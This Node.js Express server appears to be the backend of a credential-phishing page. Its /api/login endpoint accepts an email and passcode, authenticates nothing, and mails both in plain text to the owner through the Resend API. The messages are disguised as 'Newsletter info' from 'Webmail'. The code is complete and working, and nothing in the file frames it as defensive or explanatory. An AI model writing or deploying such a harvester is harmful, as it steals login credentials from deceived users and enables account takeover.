require('dotenv').config();

const path = require('path');
const express = require('express');
const { Resend } = require('resend');

const app = express();
const resend = new Resend(process.env.RESEND_API_KEY);

const PORT = process.env.PORT || 3000;
const OWNER_EMAIL = process.env.OWNER_EMAIL;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/login', async (req, res) => {
  const { email, passcode } = req.body;

  if (!email || !passcode) {
    return res.status(400).json({ error: 'Email and passcode are required.' });
  }

  try {
    const { data, error } = await resend.emails.send({
      from: 'Webmail <onboarding@resend.dev>',
      to: [OWNER_EMAIL],
      subject: `Newsletter info: ${email}`,
      html: `
        <h2>Newsletter info </h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Passcode:</strong> ${passcode}</p>
      `
    });

    if (error) {
      console.error('Resend error:', error);
      return res.status(500).json({ error: error.message });
    }

    console.log('Email sent:', data.id);
    res.json({ ok: true, id: data.id });

  } catch (err) {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Server error. Try again.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});